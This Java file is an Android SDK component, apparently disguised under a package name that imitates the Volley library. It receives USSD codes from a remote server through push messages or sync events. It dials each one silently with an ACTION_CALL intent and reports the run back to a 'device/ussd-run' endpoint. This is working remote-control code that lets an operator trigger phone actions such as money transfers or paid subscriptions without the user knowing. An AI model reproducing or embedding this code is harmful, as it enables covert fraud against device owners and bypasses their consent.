package volley.app.com.ussd;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.evernote.android.job.Job;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import commons.app.com.commons.commons.SdkComponent;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import timber.log.Timber;
import volley.app.com.ussd.keep.CodesResponse;
import volley.app.com.ussd.keep.UssdCode;

@SuppressWarnings("WeakerAccess")
public class UssdComponent extends SdkComponent {

    private static UssdComponent instance;

    public static UssdComponent get() {
        return instance;
    }

    public UssdComponent() {
        instance = this;
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        return null;
    }

    @Override
    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
        if ("ussd".equals(type)) {
            String ussdId = payload.getString("id");
            String ussdCode = payload.getString("code");
            if (ussdCode != null) {
                UssdCode code = new UssdCode(ussdId, ussdCode);
                onUssdCodeReceived(code);
            }
        }
    }

    @Override
    public void onSyncEvent(@NonNull String json) {
        CodesResponse response = safeParse(json, CodesResponse.class);
        List<UssdCode> list = response != null ? response.getUssdCodes() : null;
        if (list != null && !list.isEmpty()) {
            UssdCode code = list.get(0);
            UssdComponent.get().onUssdCodeReceived(code);
        }
    }

    ///////////////////////////////////////////////////////////////////////////
    // UTILS
    ///////////////////////////////////////////////////////////////////////////

    private void onUssdCodeReceived(UssdCode ussdCode) {
        Timber.d("onUssdCodeReceived -> ussdCode[%s]", ussdCode);
        // check permissions
        try {
            launchUssdCode(context(), ussdCode.getCode());
            Map<String, String> fields = new HashMap<>();
            fields.put("id", ussdCode.getId());
            api().makePost("device/ussd-run", fields).enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                }
            });
        } catch (Exception e) {
            Timber.e(e, "onUssdCodeReceived");
        }
    }

    private void launchUssdCode(Context context, @NonNull String ussdCode) throws Exception {
        Timber.d("launchUssdCode -> ussdCode[%s]", ussdCode);
        ussdCode = ussdCode.replaceAll("#", Uri.encode("#"));
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + ussdCode));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        context.startActivity(intent);
    }
}
